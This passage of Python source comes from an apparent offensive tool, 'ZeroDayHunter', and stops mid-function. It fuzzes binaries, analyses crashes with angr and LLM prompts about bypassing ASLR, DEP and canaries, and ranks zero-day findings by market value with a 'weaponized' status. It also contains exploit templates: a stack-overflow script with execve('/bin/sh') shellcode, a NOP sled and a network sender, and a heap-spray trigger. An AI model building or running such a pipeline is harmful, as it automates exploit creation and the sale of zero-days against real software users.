        min_value_usd: float = 0,
        session_id: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """List all zero-day discoveries, optionally filtered.

        Args:
            min_exploitability: Minimum ExploitabilityTier name (e.g. "LIKELY").
            min_value_usd: Minimum market value in USD.
            session_id: Filter to a specific fuzz session.

        Returns:
            List of finding dicts with full vulnerability details.
        """
        results = list(self._findings)

        if session_id:
            results = [f for f in results if f.crash.session_id == session_id]

        if min_exploitability:
            try:
                min_tier = ExploitabilityTier[min_exploitability.upper()]
                results = [f for f in results if f.analysis.exploitability_tier.value >= min_tier.value]
            except KeyError:
                pass

        if min_value_usd > 0:
            results = [f for f in results if f.market_value_usd >= min_value_usd]

        # Sort by market value descending
        results.sort(key=lambda f: f.market_value_usd, reverse=True)

        return [self._finding_to_dict(f) for f in results]

    def build_finding(
        self,
        crash_analysis: dict,
        exploit_result: Optional[dict] = None,
    ) -> Dict[str, Any]:
        """Assemble a complete VulnerabilityFinding from analysis + exploit.

        This ties the crash, analysis, exploit, valuation, and disposition
        together into a single finding and appends it to the discoveries list.
        """
        analysis = self._dict_to_analysis(crash_analysis)
        finding_id = f"ZD-{analysis.crash_id[:12].upper()}"

        # Find the target from the crash's session
        target = SoftwareTarget(name="unknown", version="unknown")
        session = self._fuzz_sessions.get(analysis.crash.session_id)
        if session:
            target = session.target

        # Exploit code
        exploit_code = None
        exploitation_status = "unexploited"
        if exploit_result and exploit_result.get("success"):
            exploit_code = exploit_result.get("exploit_code")
            exploitation_status = "poc"
            if exploit_result.get("effectiveness_score", 0) > 0.7:
                exploitation_status = "weaponized"

        # CVSS estimate
        cvss_score = self._estimate_cvss(analysis, target)
        cvss_vector = self._build_cvss_vector(analysis, target)

        # Value assessment
        vuln_dict = {
            "target": asdict(target),
            "analysis": self._analysis_to_dict(analysis),
        }
        valuation = self.assess_vuln_value(vuln_dict)

        # Disposition
        full_vuln = {
            **vuln_dict,
            "market_value_usd": valuation["market_value_usd"],
            "value_confidence": valuation["value_confidence"],
        }
        disposition = self.decide_disposition(full_vuln)

        finding = VulnerabilityFinding(
            finding_id=finding_id,
            target=target,
            crash=analysis.crash,
            analysis=analysis,
            exploit_code=exploit_code,
            exploitation_status=exploitation_status,
            cvss_score=cvss_score,
            cvss_vector=cvss_vector,
            market_value_usd=valuation["market_value_usd"],
            market_confidence=valuation["value_confidence"],
            disposition=Disposition(disposition),
            discovery_date=datetime.now(timezone.utc),
            tags=self._generate_tags(analysis, target),
        )

        with self._lock:
            self._findings.append(finding)

        logger.info("Finding %s created — tier=%s value=$%.0f disposition=%s",
                     finding_id, analysis.exploitability_tier.name,
                     valuation["market_value_usd"], disposition)

        return self._finding_to_dict(finding)

    # ==================================================================
    # Internal — Fuzzing Execution
    # ==================================================================

    def _build_fuzz_config(
        self,
        target: SoftwareTarget,
        strategy: FuzzStrategy,
        backend: FuzzerBackend,
        input_seeds: Optional[List[str]],
        duration_minutes: int,
        max_crashes: int,
        parallel_instances: int,
        memory_limit_mb: int,
        extra_env: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Build the fuzzer configuration dict for a campaign."""
        config: Dict[str, Any] = {
            "target_binary": target.binary_path,
            "target_args": "@@",            # AFL-style input placeholder
            "timeout_ms": 5000,
            "mem_limit_mb": memory_limit_mb,
            "dict": None,                   # Auto-generated from LLM analysis
            "parallel_instances": parallel_instances,
            "strategy": strategy.value,
            "backend": backend.value,
            "duration_minutes": duration_minutes,
            "max_crashes": max_crashes,
        }

        # Seed corpus
        seeds = list(input_seeds or [])
        if not seeds:
            seeds = self._generate_default_seeds(target)
        config["seed_corpus"] = seeds
        config["seed_count"] = len(seeds)

        # Network fuzzing specifics
        if backend == FuzzerBackend.NETWORK and target.network_ports:
            config["network_target"] = {
                "host": "127.0.0.1",
                "ports": target.network_ports,
                "protocol": target.protocol or "tcp",
            }
            config["target_args"] = ""

        # Mutation configuration per strategy
        if strategy == FuzzStrategy.GRAMMAR_AWARE:
            config["grammar_file"] = self._infer_grammar_file(target)
            config["mutation_power"] = 2
        elif strategy == FuzzStrategy.SYMBOLIC_GUIDED:
            config["solver_timeout_ms"] = 30000
            config["max_symbolic_input_size"] = 4096
        elif strategy == FuzzStrategy.CODE_PATH_AWARE:
            config["path_weights"] = {}  # Populated by LLM analysis
        elif strategy == FuzzStrategy.HYBRID:
            config.update({
                "grammar_file": self._infer_grammar_file(target),
                "mutation_power": 2,
                "solver_timeout_ms": 10000,
            })

        # Extra environment
        if extra_env:
            config["env"] = extra_env

        return config

    def _execute_fuzz_campaign(
        self,
        session: FuzzSession,
        input_seeds: List[str],
        duration_minutes: int,
        max_crashes: int,
        fuzz_config: Dict[str, Any],
        ai_guidance: Dict[str, Any],
    ) -> None:
        """Execute the fuzzing campaign (runs in background thread).

        In a real deployment this would launch afl-fuzz, libfuzzer, honggfuzz,
        or a boofuzz-based network fuzzer as a subprocess. This implementation
        provides the full orchestration skeleton and mocks execution when the
        fuzzer binary is not available.
        """
        session.status = "running"
        start = time.time()
        deadline = start + (duration_minutes * 60)

        logger.info("Fuzz session %s: starting campaign (deadline=%s)",
                     session.session_id, datetime.fromtimestamp(deadline, tz=timezone.utc).isoformat())

        # Determine fuzzer command
        fuzzer_cmd = self._resolve_fuzzer_command(session.backend, fuzz_config)

        if fuzzer_cmd is None:
            # Fuzzer not installed — run simulated campaign with mock crash generation
            self._simulate_fuzz_campaign(session, deadline, max_crashes, fuzz_config, ai_guidance)
        else:
            # Real fuzzer execution
            self._run_real_fuzzer(session, fuzzer_cmd, deadline, max_crashes, fuzz_config)

        session.end_time = datetime.now(timezone.utc)
        session.status = "completed"
        elapsed = time.time() - start
        logger.info("Fuzz session %s: completed in %.1f min — %d execs, %d unique crashes, %.1f%% coverage",
                     session.session_id, elapsed / 60, session.total_executions,
                     session.unique_crashes, session.coverage_pct)

    def _resolve_fuzzer_command(
        self, backend: FuzzerBackend, config: Dict[str, Any]
    ) -> Optional[List[str]]:
        """Resolve the fuzzer binary path. Returns None if not available."""
        binary = self._check_fuzzer_backend(backend)
        if binary is None:
            return None

        target_bin = config.get("target_binary", "")
        output_dir = tempfile.mkdtemp(prefix=f"fuzz_{backend.value}_")
        input_dir = tempfile.mkdtemp(prefix="fuzz_seeds_")

        # Write seed files
        for i, seed_data in enumerate(config.get("seed_corpus", [])):
            seed_path = os.path.join(input_dir, f"seed_{i:04d}")
            try:
                with open(seed_path, "wb") as f:
                    if isinstance(seed_data, str):
                        f.write(seed_data.encode("utf-8", errors="replace"))
                    else:
                        f.write(seed_data)
            except Exception:
                pass

        if backend == FuzzerBackend.AFLPLUSPLUS:
            return [
                binary, "-i", input_dir, "-o", output_dir,
                "-m", str(config.get("mem_limit_mb", 4096)),
                "-t", str(config.get("timeout_ms", 5000)),
                "--", target_bin, config.get("target_args", "@@"),
            ]
        elif backend == FuzzerBackend.HONGGFUZZ:
            return [
                binary, "-i", input_dir, "-o", output_dir,
                "--", target_bin, config.get("target_args", "@@"),
            ]
        elif backend == FuzzerBackend.LIBFUZZER:
            return [
                target_bin, input_dir,
                f"-max_len={config.get('max_symbolic_input_size', 4096)}",
                f"-timeout={config.get('timeout_ms', 5000) // 1000}",
            ]
        return None

    def _run_real_fuzzer(
        self,
        session: FuzzSession,
        cmd: List[str],
        deadline: float,
        max_crashes: int,
        config: Dict[str, Any],
    ) -> None:
        """Run a real fuzzer binary as a subprocess and monitor its output."""
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            assert proc.stdout is not None

            crash_count = 0
            for line in proc.stdout:
                # Parse AFL++ / honggfuzz / libfuzzer output for stats
                self._parse_fuzzer_output_line(line, session)

                # Check for crashes in output
                if self._is_crash_line(line):
                    crash_count += 1
                    crash = self._parse_crash_from_fuzzer_output(line, session.session_id)
                    if crash:
                        with self._lock:
                            if crash.crash_hash not in self._crash_db:
                                self._crash_db[crash.crash_hash] = crash
                                session.crash_hashes.add(crash.crash_hash)
                        session.unique_crashes = len(session.crash_hashes)

                # Stop conditions
                if time.time() > deadline:
                    proc.terminate()
                    break
                if crash_count >= max_crashes:
                    proc.terminate()
                    break

            proc.wait(timeout=30)
        except FileNotFoundError:
            self._simulate_fuzz_campaign(session, deadline, max_crashes, config, {})
        except Exception as exc:
            logger.error("Fuzzer execution error in session %s: %s", session.session_id, exc)
            session.status = "failed"

    def _simulate_fuzz_campaign(
        self,
        session: FuzzSession,
        deadline: float,
        max_crashes: int,
        config: Dict[str, Any],
        ai_guidance: Dict[str, Any],
    ) -> None:
        """Simulate a fuzzing campaign for testing/demo when fuzzer unavailable.

        Generates realistic fuzzing statistics and occasional mock crashes.
        """
        import random

        base_interval = 0.05  # seconds between simulated executions
        crash_prob = 0.002    # probability per execution

        # AI guidance improves crash discovery rate
        if ai_guidance:
            crash_prob *= 1.5

        execs = 0
        crashes_generated = 0
        while time.time() < deadline and crashes_generated < max_crashes:
            time.sleep(base_interval)
            execs += random.randint(1, 20)

            if random.random() < crash_prob:
                crash = self._generate_mock_crash(session.session_id, execs)
                if crash:
                    with self._lock:
                        if crash.crash_hash not in self._crash_db:
                            self._crash_db[crash.crash_hash] = crash
                            session.crash_hashes.add(crash.crash_hash)
                    crashes_generated += 1

            # Update stats periodically
            if execs % 10000 == 0:
                session.total_executions = execs
                session.unique_crashes = len(session.crash_hashes)
                session.coverage_pct = min(85.0, 5.0 + math.log2(max(1, execs)) * 8.0)
                session.paths_found = int(execs * 0.003)

        session.total_executions = execs
        session.unique_crashes = len(session.crash_hashes)
        session.coverage_pct = min(85.0, 5.0 + math.log2(max(1, execs)) * 8.0)
        session.paths_found = int(execs * 0.003)

    # ==================================================================
    # Internal — Crash Parsing & Analysis
    # ==================================================================

    def _parse_crash_dump(self, dump_text: str, binary_path: str) -> Optional[CrashDump]:
        """Parse a crash dump (GDB/ASAN/coredumpctl output) into a CrashDump."""
        crash_id = str(uuid.uuid4())[:12]

        # Extract signal
        signal_num = 11  # Default SIGSEGV
        signal_name = "SIGSEGV"
        sig_match = re.search(r'(?:signal|SIGNAL)\s+(\d+)\s*[\(:]?\s*(\w+)', dump_text, re.IGNORECASE)
        if sig_match:
            signal_num = int(sig_match.group(1))
            signal_name = sig_match.group(2).upper()
        else:
            # Try alternate patterns
            for sig_num, sig_name in self._SIGNAL_NAMES.items():
                if sig_name in dump_text.upper():
                    signal_num = sig_num
                    signal_name = sig_name
                    break

        # Extract fault address
        fault_address = "0x00000000"
        fa_match = re.search(
            r'(?:fault|access|at)\s+(?:address|addr)?\s*(0x[0-9a-fA-F]+)', dump_text, re.IGNORECASE
        )
        if fa_match:
            fault_address = fa_match.group(1)

        # Extract backtrace
        backtrace = []
        bt_section = False
        for line in dump_text.splitlines():
            stripped = line.strip()
            if re.match(r'^(#\d+|Thread \d+|Backtrace:)', stripped):
                bt_section = True
            if bt_section and stripped:
                if re.match(r'^#\d+', stripped):
                    backtrace.append(stripped)
                elif backtrace and not re.match(r'^(#\d+|0x[0-9a-fA-F]+)', stripped):
                    bt_section = False

        # If no formal backtrace found, try to extract frame addresses
        if not backtrace:
            frame_matches = re.findall(
                r'(?:#\d+\s+)?(0x[0-9a-fA-F]+\s+in\s+.+)', dump_text
            )
            backtrace = frame_matches[:20]

        # Extract registers from GDB-like output
        registers: Dict[str, str] = {}
        for line in dump_text.splitlines():
            reg_match = re.match(
                r'^\s*(R[ABCD]X|R[SD]I|R[SB]P|RSP|RIP|R\d+|E[ABCD]X|E[SD]I|E[SB]P|ESP|EIP)\s*[:=]\s*(0x[0-9a-fA-F]+|\d+)',
                line, re.IGNORECASE
            )
            if reg_match:
                registers[reg_match.group(1).upper()] = reg_match.group(2)

        # Extract crashing instruction
        crashing_instr = None
        instr_match = re.search(r'=>\s+(0x[0-9a-fA-F]+):\s+(.+)', dump_text)
        if instr_match:
            crashing_instr = f"{instr_match.group(1)}: {instr_match.group(2).strip()}"
        else:
            instr_match = re.search(
                r'(?:instruction|faulting\s+instruction)[:\s]+(.+)', dump_text, re.IGNORECASE
            )
            if instr_match:
                crashing_instr = instr_match.group(1).strip()

        # Extract ASAN report if present
        asan_report = None
        if "AddressSanitizer" in dump_text or "ASAN:" in dump_text:
            asan_start = dump_text.find("AddressSanitizer")
            if asan_start == -1:
                asan_start = dump_text.find("==ERROR:")
            if asan_start >= 0:
                asan_report = dump_text[asan_start:asan_start + 2000]

        # Extract memory map
        memory_map: List[Dict[str, str]] = []
        map_section = False
        for line in dump_text.splitlines():
            if re.match(r'^\s*(Start|Mapping|Memory map|VMA)', line, re.IGNORECASE):
                map_section = True
                continue
            if map_section:
                map_match = re.match(
                    r'^\s*(0x[0-9a-fA-F]+)\s*[-–]\s*(0x[0-9a-fA-F]+)\s+(\S+)\s+(.+)',
                    line
                )
                if map_match:
                    memory_map.append({
                        "start": map_match.group(1),
                        "end": map_match.group(2),
                        "perms": map_match.group(3),
                        "mapping": map_match.group(4).strip(),
                    })
                elif not line.strip():
                    map_section = False

        return CrashDump(
            crash_id=crash_id,
            session_id="",
            crash_hash="",  # Computed later
            signal=signal_num,
            signal_name=signal_name,
            fault_address=fault_address,
            registers=registers,
            backtrace=backtrace,
            crashing_instruction=crashing_instr,
            memory_map=memory_map,
            input_size=0,
            severity=CrashSeverity.UNKNOWN,
            asan_report=asan_report,
            timestamp=datetime.now(timezone.utc),
        )

    def _classify_crash_severity(self, crash: CrashDump) -> CrashSeverity:
        """Classify crash severity from signal, ASAN report, and backtrace."""
        # Check signal mapping first
        if crash.signal in self._SIGNAL_SEVERITY:
            base = self._SIGNAL_SEVERITY[crash.signal]

            # Refine with ASAN data
            if crash.asan_report:
                asan = crash.asan_report.lower()
                if "heap-buffer-overflow" in asan:
                    return CrashSeverity.HEAP_CORRUPTION
                if "use-after-free" in asan:
                    return CrashSeverity.HEAP_CORRUPTION
                if "double-free" in asan:
                    return CrashSeverity.HEAP_CORRUPTION
                if "stack-buffer-overflow" in asan:
                    return CrashSeverity.STACK_OVERFLOW
                if "null" in asan and "dereference" in asan:
                    return CrashSeverity.NULL_DEREF

            # Refine with fault address
            fa = crash.fault_address
            if fa in ("0x00000000", "0x0", "0x0000000000000000", "NULL", "(nil)"):
                return CrashSeverity.NULL_DEREF

            return base

        return CrashSeverity.UNKNOWN

    def _heuristic_crash_analysis(
        self, crash: CrashDump, binary_path: str
    ) -> CrashAnalysis:
        """Heuristic crash analysis when angr is unavailable.

        Uses register values, backtrace patterns, and crash type to estimate
        exploitability without formal symbolic execution.
        """
        analysis = CrashAnalysis(crash_id=crash.crash_id, crash=crash)

        # Default root cause from crash type
        severity = crash.severity
        if severity == CrashSeverity.NULL_DEREF:
            analysis.root_cause = "Null pointer dereference"
            analysis.vulnerability_type = "null_pointer_dereference"
            analysis.cwe_id = 476
        elif severity == CrashSeverity.HEAP_CORRUPTION:
            if crash.asan_report and "use-after-free" in crash.asan_report.lower():
                analysis.root_cause = "Heap use-after-free"
                analysis.vulnerability_type = "use_after_free"
                analysis.cwe_id = 416
            elif crash.asan_report and "double-free" in crash.asan_report.lower():
                analysis.root_cause = "Double free"
                analysis.vulnerability_type = "double_free"
                analysis.cwe_id = 415
            else:
                analysis.root_cause = "Heap buffer overflow"
                analysis.vulnerability_type = "heap_buffer_overflow"
                analysis.cwe_id = 122
        elif severity == CrashSeverity.STACK_OVERFLOW:
            analysis.root_cause = "Stack buffer overflow"
            analysis.vulnerability_type = "stack_buffer_overflow"
            analysis.cwe_id = 121
        elif crash.signal == 11:
            analysis.root_cause = f"Segmentation fault at {crash.fault_address}"
            analysis.vulnerability_type = "memory_corruption"
            analysis.cwe_id = 787
        elif crash.signal == 6:
            analysis.root_cause = "Assertion failure / abort"
            analysis.vulnerability_type = "assertion_failure"
        else:
            analysis.root_cause = f"Crash — signal {crash.signal} ({crash.signal_name})"
            analysis.vulnerability_type = "unknown_crash"

        # Check registers for controlled values
        for reg_name, reg_value in crash.registers.items():
            # Heuristic: if register value looks like attacker-controlled data
            # (repeating patterns, ASCII text, all same byte, etc.)
            if self._looks_controlled(reg_value):
                analysis.controlled_registers.append(reg_name)

        # Check for stack pivot indicators
        if any(r.upper() in {"RSP", "ESP"} for r in analysis.controlled_registers):
            analysis.stack_pivot_possible = True

        # Check for ROP opportunity
        if any(r.upper() in {"RIP", "EIP"} for r in analysis.controlled_registers):
            analysis.rop_possible = True
            analysis.aslr_bypass_possible = True  # EIP control is step 1

        # Memory write analysis from fault type
        if crash.asan_report:
            asan = crash.asan_report.lower()
            if "write of size" in asan:
                size_match = re.search(r'write of size (\d+)', asan)
                addr_match = re.search(r'at (0x[0-9a-fA-F]+)', asan)
                write_type = "stack" if "stack" in asan else "heap"
                analysis.controlled_memory_writes.append({
                    "type": write_type,
                    "size": int(size_match.group(1)) if size_match else 0,
                    "address": addr_match.group(1) if addr_match else "unknown",
                })
            if "read of size" in asan:
                size_match = re.search(r'read of size (\d+)', asan)
                analysis.controlled_memory_reads.append({
                    "type": "heap" if "heap" in asan else "unknown",
                    "size": int(size_match.group(1)) if size_match else 0,
                })

        # Backtrace analysis
        for frame in crash.backtrace:
            frame_lower = frame.lower()
            if any(kw in frame_lower for kw in ["memcpy", "strcpy", "sprintf", "strcat", "gets"]):
                analysis.vulnerability_type = "stack_buffer_overflow"
                analysis.cwe_id = 121
                break
            if any(kw in frame_lower for kw in ["malloc", "free", "realloc", "new", "delete"]):
                if analysis.vulnerability_type in ("memory_corruption", "unknown_crash"):
                    analysis.vulnerability_type = "heap_corruption"
                    analysis.cwe_id = 122
                break

        return analysis

    def _analyze_with_angr(
        self, crash: CrashDump, binary_path: str
    ) -> CrashAnalysis:
        """Perform symbolic execution analysis with angr.

        This reconstructs the path from program entry to the crash site,
        identifies which input bytes influence the crash, and determines
        which registers / memory locations are controlled by attacker input.
        """
        analysis = self._heuristic_crash_analysis(crash, binary_path)

        try:
            import angr  # type: ignore[import-untyped]

            # Load the binary into angr
            proj = angr.Project(binary_path, auto_load_libs=False)

            # Find the crashing address in the binary
            crash_addr = None
            if crash.crashing_instruction:
                addr_match = re.match(r'(0x[0-9a-fA-F]+)', crash.crashing_instruction)
                if addr_match:
                    crash_addr = int(addr_match.group(1), 16)

            if crash_addr is None and crash.backtrace:
                for frame in crash.backtrace:
                    addr_match = re.match(r'#\d+\s+(0x[0-9a-fA-F]+)', frame)
                    if addr_match:
                        crash_addr = int(addr_match.group(1), 16)
                        break

            if crash_addr is None:
                logger.debug("angr: could not determine crash address — using heuristic result")
                return analysis

            # Create a symbolic state at the entry point
            state = proj.factory.entry_state()

            # Set up symbolic stdin/file input based on crash input
            if crash.input_data:
                symbolic_input = state.solver.BVS("input", len(crash.input_data) * 8)
                # Constrain to known input bytes where applicable
                for i, byte_val in enumerate(crash.input_data):
                    state.solver.add(symbolic_input.get_byte(i) == byte_val)
            else:
                symbolic_input = state.solver.BVS("input", 4096 * 8)

            # Create simulation manager and explore toward crash
            simgr = proj.factory.simulation_manager(state)

            # Try to find a path to the crash address
            simgr.explore(find=crash_addr, num_find=1)

            if simgr.found:
                found_state = simgr.found[0]

                # Check which registers are symbolically tied to input
                controlled = []
                for reg_name in crash.registers:
                    try:
                        reg_val = getattr(found_state.regs, reg_name.lower())
                        if found_state.solver.symbolic(reg_val):
                            controlled.append(reg_name)
                    except Exception:
                        pass
                analysis.controlled_registers = controlled

                # Check for controlled memory writes
                # This is a simplified check — a full analysis would inspect
                # the memory model for symbolic addresses in store operations
                analysis.symbolic_constraints = [
                    str(c) for c in found_state.solver.constraints[:10]
                ]

                analysis.confidence = min(0.95, 0.5 + len(controlled) * 0.15)
            else:
                logger.debug("angr: could not find path to crash address 0x%x", crash_addr)
                # Fall back to heuristic analysis but mark as low confidence
                analysis.confidence = min(analysis.confidence, 0.4)

        except ImportError:
            logger.debug("angr not installed — using heuristic analysis")
            analysis.confidence = min(analysis.confidence, 0.5)
        except Exception as exc:
            logger.warning("angr analysis failed: %s — falling back to heuristics", exc)
            analysis.confidence = min(analysis.confidence, 0.4)

        return analysis

    def _llm_enhance_analysis(
        self, analysis: CrashAnalysis, crash_dump: str
    ) -> None:
        """Use LLM to enhance the heuristic crash analysis."""
        if self._llm is None or not self._llm.is_available():
            return

        prompt = f"""Analyze this crash dump and determine:

1. Root cause of the crash (be specific — which code path, what input triggers it)
2. Vulnerability type (CWE)
3. Whether any registers are controlled by attacker input
4. Whether the crash could allow arbitrary read or write
5. Whether ASLR, DEP/NX, stack canaries appear bypassable
6. Likely exploit type and difficulty

Crash type: {analysis.crash.signal_name} (signal {analysis.crash.signal})
Fault address: {analysis.crash.fault_address}
Registers: {json.dumps(analysis.crash.registers)}
Backtrace: {json.dumps(analysis.crash.backtrace[:10])}
ASAN report: {analysis.crash.asan_report or 'N/A'}

Crash dump excerpt:
{crash_dump[:3000]}

Respond with JSON:
{{"root_cause": "...", "vulnerability_type": "...", "cwe_id": N, "controlled_registers": [...], "exploit_primitive": "...", "difficulty": "easy|moderate|hard|extreme", "suggested_exploit_approach": "..."}}"""

        try:
            response = self._llm.chat([{"role": "user", "content": prompt}])
            content = response.get("content", "") if isinstance(response, dict) else str(response)

            # Try to extract JSON from the response
            json_match = re.search(r'\{[\s\S]*\}', content)
            if json_match:
                llm_result = json.loads(json_match.group(0))

                if llm_result.get("root_cause"):
                    analysis.root_cause = llm_result["root_cause"]
                if llm_result.get("vulnerability_type"):
                    analysis.vulnerability_type = llm_result["vulnerability_type"]
                if llm_result.get("cwe_id"):
                    analysis.cwe_id = int(llm_result["cwe_id"])
                if llm_result.get("controlled_registers"):
                    existing = set(analysis.controlled_registers)
                    for r in llm_result["controlled_registers"]:
                        existing.add(r)
                    analysis.controlled_registers = list(existing)

                # Boost confidence when LLM agrees
                analysis.confidence = min(0.95, analysis.confidence + 0.2)
        except Exception as exc:
            logger.debug("LLM enhancement failed: %s", exc)

    def _looks_controlled(self, reg_value: str) -> bool:
        """Heuristic: does a register value look like attacker-controlled data?"""
        try:
            val = int(reg_value, 16)
        except (ValueError, TypeError):
            return False

        # Null values are not controllable
        if val == 0:
            return False

        # Stack/heap-looking addresses typically not controlled
        if 0x7F0000000000 <= val <= 0x7FFFFFFFFFFF:
            return False

        # Look for repeating byte patterns (e.g. 0x4141414141414141 = "AAAAAAAA")
        hex_str = f"{val:016x}"
        for chunk_size in [2, 4, 8]:
            chunks = [hex_str[i:i + chunk_size] for i in range(0, len(hex_str), chunk_size)]
            if len(set(chunks)) <= len(chunks) // 2 and len(chunks) >= 4:
                return True

        # ASCII-like ranges (0x20–0x7E repeated)
        byte_vals = [(val >> (i * 8)) & 0xFF for i in range(8)]
        if all(0x20 <= b <= 0x7E for b in byte_vals if b != 0):
            return True

        return False

    def _suggest_exploit_type(
        self, analysis: CrashAnalysis, reasons: List[str]
    ) -> Optional[str]:
        """Suggest the most likely exploit type based on analysis."""
        vt = analysis.vulnerability_type

        if vt in ("stack_buffer_overflow",) and analysis.controlled_registers:
            if any(r.upper() in {"RIP", "EIP"} for r in analysis.controlled_registers):
                return "stack_buffer_overflow_eip"
            return "stack_buffer_overflow"
        if vt in ("heap_buffer_overflow", "use_after_free", "double_free"):
            return "heap_exploit"
        if vt in ("null_pointer_dereference",) and analysis.controlled_memory_writes:
            return "null_deref_write_escalation"
        if analysis.controlled_memory_reads:
            return "arbitrary_read_to_rce"
        if analysis.controlled_memory_writes:
            return "write_what_where"
        if any("EIP" in r or "RIP" in r for r in reasons):
            return "rop_chain"
        return "generic_memory_corruption"

    # ==================================================================
    # Internal — Exploit Generation
    # ==================================================================

    def _exploit_gen_generate(
        self, analysis: CrashAnalysis, target_url: str, payload_style: str
    ) -> Dict[str, Any]:
        """Generate exploit via AIExploitGenerator."""
        if self._exploit_gen is None:
            return {"success": False, "error": "No exploit generator available"}

        target_info = {
            "software": analysis.crash.backtrace[0] if analysis.crash.backtrace else "unknown",
            "evasion_level": "advanced" if payload_style == "weaponized" else "basic",
            "command": "id",
            "shellcode": None,
        }
        return self._exploit_gen.generate_exploit(
            vuln_type=analysis.vulnerability_type or "generic",
            target_url=target_url or "127.0.0.1",
            cve_id="",
            target_info=target_info,
        )

    def _template_based_exploit(
        self, analysis: CrashAnalysis, target_url: str, payload_style: str
    ) -> Dict[str, Any]:
        """Fallback template-based exploit generation."""
        vt = analysis.vulnerability_type or "generic"

        if vt in ("stack_buffer_overflow",):
            return self._gen_stack_overflow_exploit(analysis, payload_style)
        elif vt in ("heap_buffer_overflow", "use_after_free", "double_free"):
            return self._gen_heap_exploit(analysis, payload_style)
        elif analysis.controlled_memory_writes:
            return self._gen_write_primitive_exploit(analysis, payload_style)
        else:
            return self._gen_generic_crash_poc(analysis, payload_style)

    def _gen_stack_overflow_exploit(
        self, analysis: CrashAnalysis, style: str
    ) -> Dict[str, Any]:
        """Generate a stack buffer overflow PoC/exploit."""
        crash = analysis.crash
        offset = len(crash.input_data) if crash.input_data else 268
        arch = "x86_64" if any(r.startswith("R") for r in crash.registers) else "x86"

        exploit_code = f'''#!/usr/bin/env python3
"""
Stack Buffer Overflow Exploit
Generated by ZeroDayHunter — {crash.crash_id}
Root cause: {analysis.root_cause}
Vulnerability: {analysis.vulnerability_type} (CWE-{analysis.cwe_id or "N/A"})
Architecture: {arch}
"""

import struct
import socket
import sys

TARGET_HOST = "{sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'}"
TARGET_PORT = {sys.argv[2] if len(sys.argv) > 2 else '9999'}
OFFSET = {offset}

# {'Weaponized' if style == 'weaponized' else 'Proof-of-Concept'} payload
# {'Contains reverse shell shellcode' if style == 'weaponized' else 'Crashes the service to confirm vulnerability'}

def create_payload():
    padding = b"A" * OFFSET
{"    # x86_64 execve(\"/bin/sh\") shellcode" if arch == "x86_64" else "    # x86 execve(\"/bin/sh\") shellcode"}
    shellcode = (
{b'        b"\\\\x48\\\\x31\\\\xf6\\\\x56\\\\x48\\\\xbf\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x2f\\\\x73"'}
{b'        b"\\\\x68\\\\x57\\\\x54\\\\x5f\\\\x6a\\\\x3b\\\\x58\\\\x99\\\\x0f\\\\x05"' if arch == "x86_64" else
        '        b"\\\\x31\\\\xc0\\\\x50\\\\x68\\\\x2f\\\\x2f\\\\x73\\\\x68\\\\x68\\\\x2f\\\\x62\\\\x69\\\\x6e"'}
{b'        b"\\\\x89\\\\xe3\\\\x50\\\\x53\\\\x89\\\\xe1\\\\xb0\\\\x0b\\\\xcd\\\\x80"'}
    )
    # RET address — points into NOP sled
    ret_addr = struct.pack({'"<Q"' if arch == "x86_64" else '"<I"'}, {'0x7fffffffe000' if arch == "x86_64" else '0xbfff0000'})
    nop_sled = b"\\\\x90" * 64

    payload = padding + ret_addr + nop_sled + shellcode
    return payload

def send_exploit():
    payload = create_payload()
    print(f"[+] Exploit payload: {{len(payload)}} bytes")
    print(f"[+] Connecting to {{TARGET_HOST}}:{{TARGET_PORT}}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.send(payload)
        print("[+] Payload sent. Check for callback.")
        import time; time.sleep(1)
        try:
            sock.send(b"id\\n")
            resp = sock.recv(4096)
            print(f"[+] Response: {{resp.decode(errors='replace')}}")
        except Exception:
            print("[*] No interactive response (expected for blind exploit)")
    except Exception as e:
        print(f"[-] Error: {{e}}")
    finally:
        sock.close()

if __name__ == "__main__":
    send_exploit()
'''

        return {
            "success": True,
            "exploit_code": exploit_code,
            "exploit_type": "stack_buffer_overflow",
            "vulnerability_type": analysis.vulnerability_type,
            "effectiveness_score": 0.7 if style == "weaponized" else 0.4,
            "notes": f"Offset may need tuning. Crash at {crash.fault_address}, signal {crash.signal_name}.",
        }

    def _gen_heap_exploit(
        self, analysis: CrashAnalysis, style: str
    ) -> Dict[str, Any]:
        """Generate a heap exploitation PoC."""
        crash = analysis.crash
        vuln_type = analysis.vulnerability_type.replace("_", " ").title()

        exploit_code = f'''#!/usr/bin/env python3
"""
{vuln_type} Exploit PoC
Generated by ZeroDayHunter — {crash.crash_id}
Root cause: {analysis.root_cause}
CWE-{analysis.cwe_id or "N/A"}
"""

import sys
import struct
import socket

TARGET = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 9999)

def heap_spray(size=0x1000):
    """Return a heap-spray payload chunk."""
    return b"A" * size

def create_trigger():
    """
    Trigger the {vuln_type} vulnerability.

    For UAF: allocate -> free -> reallocate attacker data -> trigger dangling pointer.
    For heap overflow: overflow adjacent chunk metadata -> trigger free/malloc consolidation.
    """
    # Phase 1: Set up heap state
    spray = heap_spray(0x800)

    # Phase 2: Trigger vulnerability
    # Input shape determined from crash analysis
    trigger = {repr(crash.input_data[:80]) if crash.input_data else 'b"MALICIOUS_PAYLOAD"'}

    return spray + trigger

def main():
    print(f"[+] {{vuln_type}} exploit for target {{TARGET[0]}}:{{TARGET[1]}}")
    payload = create_trigger()
    print(f"[+] Sending {{len(payload)}} bytes...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect(TARGET)
        sock.send(payload)
        print("[+] Exploit sent.")
    except Exception as e:
        print(f"[-] Error: {{e}}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
'''

        return {
            "success": True,
            "exploit_code": exploit_code,
            "exploit_type": "heap_exploit",
            "vulnerability_type": analysis.vulnerability_type,
            "effectiveness_score": 0.3,
            "notes": "Heap exploitation requires target-specific grooming. Use with GDB attached.",
        }

    def _gen_write_primitive_exploit(
        self, analysis: CrashAnalysis, style: str
    ) -> Dict[str, Any]:
